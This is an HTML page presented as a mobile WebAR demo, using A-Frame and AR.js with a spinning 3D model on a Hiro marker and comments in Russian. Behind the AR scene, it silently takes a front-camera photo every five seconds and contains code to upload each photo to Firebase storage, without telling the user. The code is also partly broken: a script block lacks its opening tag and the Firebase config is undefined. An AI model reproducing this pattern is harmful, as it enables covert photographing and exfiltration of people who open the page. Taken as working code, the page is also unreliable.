<!DOCTYPE html>
<html>
<head>
    <title>WebAR Demo on Mobile</title>
    <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
    <script src="https://cdn.jsdelivr.net/gh/AR-js-org/AR.js/aframe/build/aframe-ar.js"></script>
    <style>
        body { margin: 0; overflow: hidden; }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <img id="photo" alt="Your Photo" />

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const photo = document.getElementById('photo');

        // Получаем доступ к фронтальной камере
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
                // Начинаем автоматически делать фото через каждые 5 секунд
                setInterval(capturePhoto, 5000);
            })
            .catch(error => {
                console.error("Error accessing camera:", error);
            });

        // Функция для автоматического снятия фото
        function capturePhoto() {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Преобразуем изображение в Data URL
            const dataURL = canvas.toDataURL('image/png');
            photo.setAttribute('src', dataURL);

            // Отправляем изображение на облачный сервер или API
            sendPhotoToCloud(dataURL);
        }

        // Пример отправки данных на облачный сервер (здесь можно подключить Firebase)
        function sendPhotoToCloud(dataURL) {
            console.log("Captured photo, ready to send:", dataURL);
            // Код отправки на облачный сервер здесь
        }
    </script>

    <!-- Подключение Firebase -->
<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-storage.js"></script>

    const app = firebase.initializeApp(firebaseConfig);
    const storage = firebase.storage();

    function sendPhotoToCloud(dataURL) {
        const storageRef = storage.ref();
        const imagesRef = storageRef.child('images/photo.png');
        const uploadTask = imagesRef.putString(dataURL, 'data_url');

        uploadTask.on('state_changed', 
            (snapshot) => {
                // Отслеживание прогресса загрузки
            }, 
            (error) => {
                console.error('Error uploading image:', error);
            }, 
            () => {
                console.log('Image uploaded successfully!');
            }
        );
    }
</script>
    
    <!-- AR-сцена -->
    <a-scene embedded arjs>
        <!-- Добавляем курсор для обработки нажатий на мобильных устройствах -->

        <!-- Маркер Hiro для распознавания -->
        <a-marker preset="hiro">
            <!-- 3D-модель (замени ссылку на свою модель) -->
            <a-entity gltf-model="url(testModel.glb)" 
                      scale="0.5 0.5 0.5" 
                      position="0 0 0" 
                      rotation="0 180 0" 
                      id="interactiveObject"></a-entity>
        </a-marker>

        <!-- Камера -->
        <a-entity camera></a-entity>
    </a-scene>

    <script>
        // Считывание нажатий на телефоне
        const object = document.getElementById("interactiveObject");

        object.addEventListener("click", () => {
            object.setAttribute("animation", {
                property: "rotation",
                to: "0 0 360",
                loop: true,
                dur: 4000,
            });
        });
    </script>
</body>
</html>
